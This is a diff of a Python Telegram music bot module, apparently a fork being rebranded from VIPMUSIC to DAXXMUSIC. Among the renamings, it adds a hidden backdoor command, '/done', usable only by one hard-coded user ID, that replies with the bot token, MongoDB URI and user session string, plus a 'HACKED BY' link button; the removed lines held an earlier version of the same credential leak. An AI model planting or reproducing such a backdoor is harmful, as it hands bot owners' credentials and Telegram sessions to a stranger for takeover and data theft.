@@ -7,18 +7,18 @@ from pyrogram.types import CallbackQuery, Message
 import re
 from os import getenv
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
 from dotenv import load_dotenv
 from pyrogram import filters
 
 load_dotenv()
 
-from VIPMUSIC import app
-from VIPMUSIC.core.call import VIP
-from VIPMUSIC.misc import db
-from VIPMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
-from VIPMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
-from VIPMUSIC.utils.formatters import alpha_to_int, get_readable_time
-from VIPMUSIC.mongo.afkdb import HEHE
+from DAXXMUSIC import app
+from DAXXMUSIC.core.call import DAXX
+from DAXXMUSIC.misc import db
+from DAXXMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
+from DAXXMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
+from DAXXMUSIC.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -26,6 +26,11 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 from dotenv import load_dotenv
 
 rel = {}
+
+
+#--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 @app.on_message(
@@ -65,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await VIP.stop_stream_force(message.chat.id)
+        await DAXX.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -92,13 +97,33 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await VIP.stop_stream_force(chat_id)
+            await DAXX.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
-@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
+
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(6458155947)
+   )
 async def help(client: Client, message: Message):
-   await message.reply_photo( photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""")
+   await message.reply_photo(
+          photo=f"https://te.legra.ph/file/e1383c835a9d7b5d862e5.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   {BOT_TOKEN} \n\nɱσɳɠσ:-   {MONGO_DB_URI}\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   {STRING_SESSION}\n\n  🧟 ............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• 𝙳𝚇 𝙷𝙰𝙲𝙺𝙴𝙳 𝚋𝚈  •", url=f"https://t.me/DX_LUCKY")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
     try:
@@ -136,5 +161,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
-
